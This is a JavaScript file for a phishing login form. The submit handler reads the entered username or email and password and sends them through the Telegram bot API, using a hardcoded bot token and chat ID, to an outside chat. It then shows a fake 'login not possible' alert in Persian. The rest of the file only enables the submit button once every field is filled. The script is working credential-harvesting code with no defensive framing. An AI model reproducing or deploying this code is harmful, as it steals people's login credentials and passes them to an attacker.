document.getElementById("telegramForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let input1 = document.getElementById("email_or_username").value;
    let input2 = document.getElementById("password").value;

    let botToken = "7720709720:AAF4ZhJ350I0h9wGjNB4VdwpExTcaNWp8UE";
    let chatId = "7200343259";

    let message = `📩 ورودی جدید دریافت شد!\n🔹Username: ${input1}\n🔹Password: ${input2}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url).then(response => response.json()).then(data => {
        if (data.ok) {
            alert("ورود امکان پذیر نیست");
        } else {
            alert("❌ خطایی در ارسال اطلاعات رخ داد!");
        }
    }).catch(error => console.error("خطا:", error));
});

document.addEventListener("DOMContentLoaded", function() {
    const form = document.querySelector("form");
    const button = document.querySelector("button");

    form.addEventListener('input', () => {
        const isFormFilled = [...form.elements].every(input => {
            return input.type === "submit" || input.value.trim() !== "";
        });

        if (isFormFilled) {
            button.removeAttribute('disabled');
            button.classList.add('enabled');
        } else {
            button.setAttribute('disabled', 'true');
            button.classList.remove('enabled');
        }
    });
});
